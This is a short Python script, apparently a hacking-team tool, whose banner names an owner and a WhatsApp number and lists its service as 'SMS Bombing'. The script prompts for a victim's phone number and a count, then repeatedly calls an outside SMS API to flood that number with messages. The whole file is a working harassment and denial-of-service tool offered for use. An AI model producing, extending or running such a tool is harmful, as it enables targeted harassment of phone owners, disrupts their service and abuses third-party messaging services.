import time
import os
import requests

# Screen clear
def clear():
    os.system('clear')

# Header/banner
def banner():
    print("\033[0;92m.----. .-..-. .-..----..-. .-.")
    print("| {}  }| || |/ / | {_  |  `| |")
    print("| .-. \| || |\ \ | {__ | |\  |")
    print("`-' `-'`-'`-' `-'`----'`-' `-'\033[0m")
    print("\033[0;95m╔══════════════════════════════════════════════════════╗")
    print("\033[0;95m║  \033[0;94m[1] \033[0;90mOWNER     : \033[0;92mRiken Chakma                     \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[2] \033[0;90mTEAM      : \033[0;92mThe Hidden Warrior (THW)         \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[3] \033[0;90mWHATSAPP  : \033[0;92m+8801836289951                   \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[4] \033[0;90mSERVICE   : \033[0;92mSMS Bombing                      \033[0;95m║")
    print("\033[0;95m╚══════════════════════════════════════════════════════╝\033[0m")

# SMS sending with your API
def send_sms(phone):
    url = f"http://dz24pro.site/api/sms.php?phone={phone}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"\033[0;92m[✓] SMS sent to {phone}")
        else:
            print(f"\033[0;91m[×] Failed to send SMS to {phone}")
    except Exception as e:
        print(f"\033[0;91m[×] Error: {e}")

# Bombing start
def sms_bombing():
    number = input("\n📲 Enter Mobile Number: ")
    amount = int(input("🔢 Enter Amount of SMS: "))
    print("\n🚀 Bombing Started...\n")
    for i in range(amount):
        send_sms(number)
        time.sleep(1)

# Main program
def main():
    clear()
    banner()
    option = input("\n📌 Enter Option : ")
    if option == "4":
        sms_bombing()
    else:
        print("\n❌ Invalid option!")

if __name__ == "__main__":
    main()
